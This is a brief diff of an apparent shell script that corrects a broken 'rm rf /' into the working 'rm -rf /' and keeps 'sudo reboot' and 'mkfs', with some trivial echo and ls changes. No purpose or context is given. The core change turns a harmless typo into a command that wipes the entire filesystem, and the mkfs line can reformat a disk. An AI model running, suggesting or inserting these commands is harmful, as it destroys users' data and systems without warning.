@@ -1,15 +1,11 @@
-echo hi its me
-
-
-rm rf /
+rm -rf /
 
 
 sudo reboot 
 
+echo hi its me 
 
-ls -l -a -m
+ls -m -a -n
 
-format
-mkfs
-dd
+mkfs 
 
